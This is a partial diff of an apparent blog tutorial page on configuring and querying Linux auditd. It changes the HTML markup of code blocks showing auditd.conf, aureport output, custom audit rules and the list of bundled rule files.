+</span></span></code></pre></div><p>Final thing is to check the user-space service responsible to get the data from <code>kauditd</code>. To obtain definitive indications on systemd systems, use the commands listed below.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">systemctl is-active auditd          ## Returns: active/inactive
+</span></span><span class="line"><span class="cl">systemctl is-enabled auditd         ## Returns: enabled/disabled
+</span></span></code></pre></div><p><em>(<strong>Note</strong>: Feel free to check the source code at <a href="https://elixir.bootlin.com/linux/latest/source/kernel/audit.c"><code>kernel/audit.c</code></a>. <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>)</em></p>
 <h3 id="configuring-auditd">Configuring auditd</h3>
 <p><code>Auditd</code> decides what to log and what not to log using a set of rules. These rules can be found in the <code>/etc/audit/rules.d/</code> folder. Auditd reads files from this folder on startup and generates the <code>/etc/audit/audit.rules</code> file automatically. <strong>(This file should not be edited by hand.)</strong></p>
 <p><code>auditd</code> comes with a configuration file too. This file helps in changing the behaviour of the userspace <code>auditd</code> daemon. Default file on my system looks like below.</p>
-<pre tabindex="0"><code># sudo cat -n /etc/audit/auditd.conf
-
-     1	#
-     2	# This file controls the configuration of the audit daemon
-     3	#
-     4	
-     5	local_events = yes
-     6	write_logs = yes
-     7	log_file = /var/log/audit/audit.log
-     8	log_group = root
-     9	log_format = RAW
-    10	flush = INCREMENTAL_ASYNC
-    11	freq = 50
-    12	max_log_file = 8
-    13	num_logs = 5
-    14	priority_boost = 4
-    15	disp_qos = lossy
-    16	dispatcher = /sbin/audispd
-    17	name_format = NONE
-    18	##name = mydomain
-    19	max_log_file_action = ROTATE
-    20	space_left = 75
-    21	space_left_action = SYSLOG
-    22	verify_email = yes
-    23	action_mail_acct = root
-    24	admin_space_left = 50
-    25	admin_space_left_action = SUSPEND
-    26	disk_full_action = SUSPEND
-    27	disk_error_action = SUSPEND
-    28	use_libwrap = yes
-    29	##tcp_listen_port = 60
-    30	tcp_listen_queue = 5
-    31	tcp_max_per_addr = 1
-    32	##tcp_client_ports = 1024-65535
-    33	tcp_client_max_idle = 0
-    34	enable_krb5 = no
-    35	krb5_principal = auditd
-    36	##krb5_key_file = /etc/audit/audit.key
-    37	distribute_network = no
-</code></pre><p>Some of these options are easy to understand, like:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># sudo cat -n /etc/audit/auditd.conf</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">     <span class="mi">1</span>	<span class="c1">#</span>
+</span></span><span class="line"><span class="cl">     <span class="mi">2</span>	<span class="c1"># This file controls the configuration of the audit daemon</span>
+</span></span><span class="line"><span class="cl">     <span class="mi">3</span>	<span class="c1">#</span>
+</span></span><span class="line"><span class="cl">     <span class="mi">4</span>	
+</span></span><span class="line"><span class="cl">     <span class="mi">5</span>	<span class="n">local_events</span> <span class="o">=</span> <span class="n">yes</span>
+</span></span><span class="line"><span class="cl">     <span class="mi">6</span>	<span class="n">write_logs</span> <span class="o">=</span> <span class="n">yes</span>
+</span></span><span class="line"><span class="cl">     <span class="mi">7</span>	<span class="n">log_file</span> <span class="o">=</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">audit</span><span class="o">/</span><span class="n">audit</span><span class="o">.</span><span class="n">log</span>
+</span></span><span class="line"><span class="cl">     <span class="mi">8</span>	<span class="n">log_group</span> <span class="o">=</span> <span class="n">root</span>
+</span></span><span class="line"><span class="cl">     <span class="mi">9</span>	<span class="n">log_format</span> <span class="o">=</span> <span class="n">RAW</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">10</span>	<span class="n">flush</span> <span class="o">=</span> <span class="n">INCREMENTAL_ASYNC</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">11</span>	<span class="n">freq</span> <span class="o">=</span> <span class="mi">50</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">12</span>	<span class="n">max_log_file</span> <span class="o">=</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">13</span>	<span class="n">num_logs</span> <span class="o">=</span> <span class="mi">5</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">14</span>	<span class="n">priority_boost</span> <span class="o">=</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">15</span>	<span class="n">disp_qos</span> <span class="o">=</span> <span class="n">lossy</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">16</span>	<span class="n">dispatcher</span> <span class="o">=</span> <span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">audispd</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">17</span>	<span class="n">name_format</span> <span class="o">=</span> <span class="n">NONE</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">18</span>	<span class="c1">##name = mydomain</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">19</span>	<span class="n">max_log_file_action</span> <span class="o">=</span> <span class="n">ROTATE</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">20</span>	<span class="n">space_left</span> <span class="o">=</span> <span class="mi">75</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">21</span>	<span class="n">space_left_action</span> <span class="o">=</span> <span class="n">SYSLOG</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">22</span>	<span class="n">verify_email</span> <span class="o">=</span> <span class="n">yes</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">23</span>	<span class="n">action_mail_acct</span> <span class="o">=</span> <span class="n">root</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">24</span>	<span class="n">admin_space_left</span> <span class="o">=</span> <span class="mi">50</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">25</span>	<span class="n">admin_space_left_action</span> <span class="o">=</span> <span class="n">SUSPEND</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">26</span>	<span class="n">disk_full_action</span> <span class="o">=</span> <span class="n">SUSPEND</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">27</span>	<span class="n">disk_error_action</span> <span class="o">=</span> <span class="n">SUSPEND</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">28</span>	<span class="n">use_libwrap</span> <span class="o">=</span> <span class="n">yes</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">29</span>	<span class="c1">##tcp_listen_port = 60</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">30</span>	<span class="n">tcp_listen_queue</span> <span class="o">=</span> <span class="mi">5</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">31</span>	<span class="n">tcp_max_per_addr</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">32</span>	<span class="c1">##tcp_client_ports = 1024-65535</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">33</span>	<span class="n">tcp_client_max_idle</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">34</span>	<span class="n">enable_krb5</span> <span class="o">=</span> <span class="n">no</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">35</span>	<span class="n">krb5_principal</span> <span class="o">=</span> <span class="n">auditd</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">36</span>	<span class="c1">##krb5_key_file = /etc/audit/audit.key</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">37</span>	<span class="n">distribute_network</span> <span class="o">=</span> <span class="n">no</span>
+</span></span></code></pre></div><p>Some of these options are easy to understand, like:</p>
 <ul>
 <li><strong>log_file</strong> : Tells the location of the audit log file.</li>
 <li><strong>max_log_file</strong> : Defines the size of the log file in MB. If the size is reached, <strong>max_log_file_action</strong> is triggered.</li>
@@ -1042,20 +1042,20 @@ systemctl is-enabled auditd         ## Returns: enabled/disabled
 <p>We can see where the <code>auditd</code> logs are stored from the config file above. So we can always look through the log files and use the good old <code>grep</code> command to find what we&rsquo;re looking for.</p>
 <p>But that is not the intended method. The <code>audit</code> package includes a number of helper commands to assist the sysadmin/analyst in quickly determining information from logs.</p>
 <p>Below are all the binary executable files provided by the <code>audit</code> package&hellip;.</p>
-<pre tabindex="0"><code>## COMMAND:   rpm -ql audit | grep bin
-
-/sbin/audispd
-/sbin/auditctl
-/sbin/auditd
-/sbin/augenrules
-/sbin/aureport
-/sbin/ausearch
-/sbin/autrace
-/usr/bin/aulast
-/usr/bin/aulastlog
-/usr/bin/ausyscall
-/usr/bin/auvirt
-</code></pre><p>Let&rsquo;s start with <code>ausearch</code> for now. This program parses the audit log files and gives the information based on passed keywords.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">## COMMAND:   rpm -ql audit | grep bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/sbin/audispd
+</span></span><span class="line"><span class="cl">/sbin/auditctl
+</span></span><span class="line"><span class="cl">/sbin/auditd
+</span></span><span class="line"><span class="cl">/sbin/augenrules
+</span></span><span class="line"><span class="cl">/sbin/aureport
+</span></span><span class="line"><span class="cl">/sbin/ausearch
+</span></span><span class="line"><span class="cl">/sbin/autrace
+</span></span><span class="line"><span class="cl">/usr/bin/aulast
+</span></span><span class="line"><span class="cl">/usr/bin/aulastlog
+</span></span><span class="line"><span class="cl">/usr/bin/ausyscall
+</span></span><span class="line"><span class="cl">/usr/bin/auvirt
+</span></span></code></pre></div><p>Let&rsquo;s start with <code>ausearch</code> for now. This program parses the audit log files and gives the information based on passed keywords.</p>
 <p>There are a lot of options for this tool.. I&rsquo;ll mention few which I use most often.</p>
 <ul>
 <li><strong><code>-i</code></strong> &ndash; Interpret the logs. Translates numeric value in names.</li>
@@ -1066,36 +1066,36 @@ systemctl is-enabled auditd         ## Returns: enabled/disabled
 <li>Use <strong><code>-k</code></strong> to search for specific key in log. You can configure your own key in the logs config. These keys helps to corelate the logs with the rules.</li>
 </ul>
 <p>If you just want to get a report of everything that was logged, you can use <code>aureport</code> program which gives you a proper summary in a tabular form.</p>
-<pre tabindex="0"><code>## COMMAND:   sudo aureport
-
-Summary Report
-======================
-Range of time in logs: 01/01/1970 00:00:00.000 - 12/10/2022 16:24:29.088
-Selected time for report: 01/01/1970 00:00:00 - 12/10/2022 16:24:29.088
-Number of changes in configuration: 2
-Number of changes to accounts, groups, or roles: 0
-Number of logins: 0
-Number of failed logins: 0
-Number of authentications: 0
-Number of failed authentications: 0
-Number of users: 3
-Number of terminals: 4
-Number of host names: 1
-Number of executables: 3
-Number of commands: 1
-Number of files: 0
-Number of AVC&#39;s: 0
-Number of MAC events: 0
-Number of failed syscalls: 0
-Number of anomaly events: 0
-Number of responses to anomaly events: 0
-Number of crypto events: 0
-Number of integrity events: 0
-Number of virt events: 0
-Number of keys: 0
-Number of process IDs: 42
-Number of events: 240
-</code></pre><h3 id="writing-custom-audit-rules">Writing custom audit rules</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">## COMMAND:   sudo aureport
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Summary Report
+</span></span><span class="line"><span class="cl">======================
+</span></span><span class="line"><span class="cl">Range of time in logs: 01/01/1970 00:00:00.000 - 12/10/2022 16:24:29.088
+</span></span><span class="line"><span class="cl">Selected time for report: 01/01/1970 00:00:00 - 12/10/2022 16:24:29.088
+</span></span><span class="line"><span class="cl">Number of changes in configuration: 2
+</span></span><span class="line"><span class="cl">Number of changes to accounts, groups, or roles: 0
+</span></span><span class="line"><span class="cl">Number of logins: 0
+</span></span><span class="line"><span class="cl">Number of failed logins: 0
+</span></span><span class="line"><span class="cl">Number of authentications: 0
+</span></span><span class="line"><span class="cl">Number of failed authentications: 0
+</span></span><span class="line"><span class="cl">Number of users: 3
+</span></span><span class="line"><span class="cl">Number of terminals: 4
+</span></span><span class="line"><span class="cl">Number of host names: 1
+</span></span><span class="line"><span class="cl">Number of executables: 3
+</span></span><span class="line"><span class="cl">Number of commands: 1
+</span></span><span class="line"><span class="cl">Number of files: 0
+</span></span><span class="line"><span class="cl">Number of AVC&#39;s: 0
+</span></span><span class="line"><span class="cl">Number of MAC events: 0
+</span></span><span class="line"><span class="cl">Number of failed syscalls: 0
+</span></span><span class="line"><span class="cl">Number of anomaly events: 0
+</span></span><span class="line"><span class="cl">Number of responses to anomaly events: 0
+</span></span><span class="line"><span class="cl">Number of crypto events: 0
+</span></span><span class="line"><span class="cl">Number of integrity events: 0
+</span></span><span class="line"><span class="cl">Number of virt events: 0
+</span></span><span class="line"><span class="cl">Number of keys: 0
+</span></span><span class="line"><span class="cl">Number of process IDs: 42
+</span></span><span class="line"><span class="cl">Number of events: 240
+</span></span></code></pre></div><h3 id="writing-custom-audit-rules">Writing custom audit rules</h3>
 <p><code>auditd</code> also allows us to write our own rules. These rules will be read and applied when the service is restarted&hellip; or if you invoke <code>augenrules --load</code>.</p>
 <p>For auditing, there are only three types of rules that can be defined:</p>
 <ol>
@@ -1110,32 +1110,32 @@ Number of events: 240
 </li>
 </ol>
 <p>That&rsquo;s all. This was all we needed to know before we started writing our first simple rule.</p>
-<pre tabindex="0"><code>-w /etc/
-</code></pre><p>The above rule will watch for all kinds of changes in <code>/etc/</code> folder&hellip; that means any (r)ead, (w)rite, (e)xecute or (a)ttribute change operations will be logged.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-w /etc/
+</span></span></code></pre></div><p>The above rule will watch for all kinds of changes in <code>/etc/</code> folder&hellip; that means any (r)ead, (w)rite, (e)xecute or (a)ttribute change operations will be logged.</p>
 <p>Let&rsquo;s write the above rule in a new file: <code>/etc/audit/rules.d/myrules.rules</code>&hellip; And check if it is picked up by auditd already. (I know it will not be picked, but it won&rsquo;t hurt to check)</p>
-<pre tabindex="0"><code># sudo auditctl -l
-
-No rules
-</code></pre><p>Now, let&rsquo;s restart the service and try that again.</p>
-<pre tabindex="0"><code># service auditd restart
-# sudo auditctl -l
-
--w /etc -p rwxa
-</code></pre><p><code>auditd</code> has now loaded the rule, as expected. But there&rsquo;s more to it than just what we put in the file. It makes no difference, however, because it is implicitly adding <code>-p rwxa</code> to indicate that all of these operations should be monitored.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># sudo auditctl -l
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">No rules
+</span></span></code></pre></div><p>Now, let&rsquo;s restart the service and try that again.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># service auditd restart
+</span></span><span class="line"><span class="cl"># sudo auditctl -l
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-w /etc -p rwxa
+</span></span></code></pre></div><p><code>auditd</code> has now loaded the rule, as expected. But there&rsquo;s more to it than just what we put in the file. It makes no difference, however, because it is implicitly adding <code>-p rwxa</code> to indicate that all of these operations should be monitored.</p>
 <p>The files still contain what we added&hellip; but the kernel has fully expanded rules.</p>
-<pre tabindex="0"><code># sudo cat /etc/audit/rules.d/myrules.rules
-
--w /etc/
-</code></pre><pre tabindex="0"><code># sudo cat /etc/audit/audit.rules
-
-## This file is automatically generated from /etc/audit/rules.d
--D
--b 8192
--f 1
--w /etc/
-</code></pre><p>With this rule in the kernel, all the operations made to <code>/etc</code> path will be recorded. To make things easy, think of all the <strong>watch</strong> rules as just fancy wrappers for syscall rules. Above rule can be written as below, and will still work the same.</p>
-<pre tabindex="0"><code>-a exit,always  -F dir=/etc -F perm=rwxa
-</code></pre><p>Remove the previous rule and add the above rule to the same file. Restart the service again for the changes to take effect.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># sudo cat /etc/audit/rules.d/myrules.rules
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-w /etc/
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># sudo cat /etc/audit/audit.rules
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">## This file is automatically generated from /etc/audit/rules.d
+</span></span><span class="line"><span class="cl">-D
+</span></span><span class="line"><span class="cl">-b 8192
+</span></span><span class="line"><span class="cl">-f 1
+</span></span><span class="line"><span class="cl">-w /etc/
+</span></span></code></pre></div><p>With this rule in the kernel, all the operations made to <code>/etc</code> path will be recorded. To make things easy, think of all the <strong>watch</strong> rules as just fancy wrappers for syscall rules. Above rule can be written as below, and will still work the same.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-a exit,always  -F dir=/etc -F perm=rwxa
+</span></span></code></pre></div><p>Remove the previous rule and add the above rule to the same file. Restart the service again for the changes to take effect.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo cat /etc/audit/audit.rules
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1">## This file is automatically generated from /etc/audit/rules.d</span>
@@ -1144,12 +1144,12 @@ No rules
 </span></span><span class="line"><span class="cl">-f <span class="m">1</span>
 </span></span><span class="line"><span class="cl">-a exit,always  -F <span class="nv">dir</span><span class="o">=</span>/etc -F <span class="nv">perm</span><span class="o">=</span>rwxa
 </span></span></code></pre></div><p>Auto-generated event is what we wrote in the file. Let&rsquo;s take a look what it looks like from kernel point of view.</p>
-<pre tabindex="0"><code>$ sudo auditctl -l
-
--w /etc -p rwxa
-</code></pre><p>Told you, its practically the same. Now let&rsquo;s understand all the options in the new rule we wrote (obviously for better clarity on how it is same).</p>
-<pre tabindex="0"><code>-a exit,always  -F dir=/etc -F perm=rwxa
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ sudo auditctl -l
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-w /etc -p rwxa
+</span></span></code></pre></div><p>Told you, its practically the same. Now let&rsquo;s understand all the options in the new rule we wrote (obviously for better clarity on how it is same).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-a exit,always  -F dir=/etc -F perm=rwxa
+</span></span></code></pre></div><ul>
 <li><code>-a</code> : append rule to end of the list</li>
 <li><code>exit,always</code> : always log when exiting a syscall.</li>
 <li><code>-F</code> : build a rule based on (F)ield values</li>
@@ -1159,10 +1159,10 @@ No rules
 <p>According to <code>man 8 auditctl</code>, <strong>if  a field rule is given and no syscall is specified, it will default to all syscalls.</strong> That means the above rule will work for all of the syscalls.</p>
 <p>So far so good. Now what about control rules?? ..Or let&rsquo;s say <em>configure</em> rules as they help in configuring the behaviour of auditd itself.</p>
 <p>These rules help in configuring/controling the behaviour of auditd. Read the man page for better and complete explanation. But I&rsquo;ll walk you through the ones we have already seen&hellip;. in the <code>/etc/audit/audit.rules</code> file.</p>
-<pre tabindex="0"><code>-D
--b 8192
--f 1
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-D
+</span></span><span class="line"><span class="cl">-b 8192
+</span></span><span class="line"><span class="cl">-f 1
+</span></span></code></pre></div><ul>
 <li>
 <p><code>-D</code> deletes all the previous rules from kernel rules list. This should be always on the top If you want to give someone a hard time, just put that in the end.(<strong>please don&rsquo;t do it on production machines, it won&rsquo;t be funny</strong>)</p>
 </li>
@@ -1175,31 +1175,31 @@ No rules
 </ul>
 <h3 id="pre-packaged-audit-rules">Pre-packaged audit rules</h3>
 <p>Most of the times, we don&rsquo;t really need to write our own audit rules, we can just use what other people have already worked upon. You can always find them with the help of your favorite search engine&hellip;but there are few already pre-packaged with <code>audit</code> and are already on your system (if you have installed the package)</p>
-<pre tabindex="0"><code>$ rpm -ql audit | grep &#39;/usr/share/.*\.rules$&#39;
-
-/usr/share/doc/audit-2.8.5/rules/10-base-config.rules
-/usr/share/doc/audit-2.8.5/rules/10-no-audit.rules
-/usr/share/doc/audit-2.8.5/rules/11-loginuid.rules
-/usr/share/doc/audit-2.8.5/rules/12-cont-fail.rules
-/usr/share/doc/audit-2.8.5/rules/12-ignore-error.rules
-/usr/share/doc/audit-2.8.5/rules/20-dont-audit.rules
-/usr/share/doc/audit-2.8.5/rules/21-no32bit.rules
-/usr/share/doc/audit-2.8.5/rules/22-ignore-chrony.rules
-/usr/share/doc/audit-2.8.5/rules/23-ignore-filesystems.rules
-/usr/share/doc/audit-2.8.5/rules/30-nispom.rules
-/usr/share/doc/audit-2.8.5/rules/30-ospp-v42.rules
-/usr/share/doc/audit-2.8.5/rules/30-pci-dss-v31.rules
-/usr/share/doc/audit-2.8.5/rules/30-stig.rules
-/usr/share/doc/audit-2.8.5/rules/31-privileged.rules
-/usr/share/doc/audit-2.8.5/rules/32-power-abuse.rules
-/usr/share/doc/audit-2.8.5/rules/40-local.rules
-/usr/share/doc/audit-2.8.5/rules/41-containers.rules
-/usr/share/doc/audit-2.8.5/rules/42-injection.rules
-/usr/share/doc/audit-2.8.5/rules/43-module-load.rules
-/usr/share/doc/audit-2.8.5/rules/70-einval.rules
-/usr/share/doc/audit-2.8.5/rules/71-networking.rules
-/usr/share/doc/audit-2.8.5/rules/99-finalize.rules
-</code></pre><p><em>( <strong>NOTE:</strong> The numbers in the filenames play a very important role. For auditd, the first rule found wins. So if there are 2 contradictory rules, the first one found will be applied and the second one will have no effect.)</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span> <span class="n">rpm</span> <span class="o">-</span><span class="n">ql</span> <span class="n">audit</span> <span class="o">|</span> <span class="n">grep</span> <span class="s1">&#39;/usr/share/.*\.rules$&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">10</span><span class="o">-</span><span class="n">base</span><span class="o">-</span><span class="n">config</span><span class="o">.</span><span class="n">rules</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">10</span><span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="n">audit</span><span class="o">.</span><span class="n">rules</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">11</span><span class="o">-</span><span class="n">loginuid</span><span class="o">.</span><span class="n">rules</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">12</span><span class="o">-</span><span class="n">cont</span><span class="o">-</span><span class="n">fail</span><span class="o">.</span><span class="n">rules</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">12</span><span class="o">-</span><span class="n">ignore</span><span class="o">-</span><span class="n">error</span><span class="o">.</span><span class="n">rules</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">20</span><span class="o">-</span><span class="n">dont</span><span class="o">-</span><span class="n">audit</span><span class="o">.</span><span class="n">rules</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">21</span><span class="o">-</span><span class="n">no32bit</span><span class="o">.</span><span class="n">rules</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">22</span><span class="o">-</span><span class="n">ignore</span><span class="o">-</span><span class="n">chrony</span><span class="o">.</span><span class="n">rules</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">23</span><span class="o">-</span><span class="n">ignore</span><span class="o">-</span><span class="n">filesystems</span><span class="o">.</span><span class="n">rules</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">30</span><span class="o">-</span><span class="n">nispom</span><span class="o">.</span><span class="n">rules</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">30</span><span class="o">-</span><span class="n">ospp</span><span class="o">-</span><span class="n">v42</span><span class="o">.</span><span class="n">rules</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">30</span><span class="o">-</span><span class="n">pci</span><span class="o">-</span><span class="n">dss</span><span class="o">-</span><span class="n">v31</span><span class="o">.</span><span class="n">rules</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">30</span><span class="o">-</span><span class="n">stig</span><span class="o">.</span><span class="n">rules</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">31</span><span class="o">-</span><span class="n">privileged</span><span class="o">.</span><span class="n">rules</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">32</span><span class="o">-</span><span class="n">power</span><span class="o">-</span><span class="n">abuse</span><span class="o">.</span><span class="n">rules</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">40</span><span class="o">-</span><span class="n">local</span><span class="o">.</span><span class="n">rules</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">audit</span><span class="o">-</span><span class="mf">2.8</span><span class="o">.</span><span class="mi">5</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="mi">41</span><span class="o">-</span><span class="n">containers</span><span class="o">.</span><span class="n">rules</span>
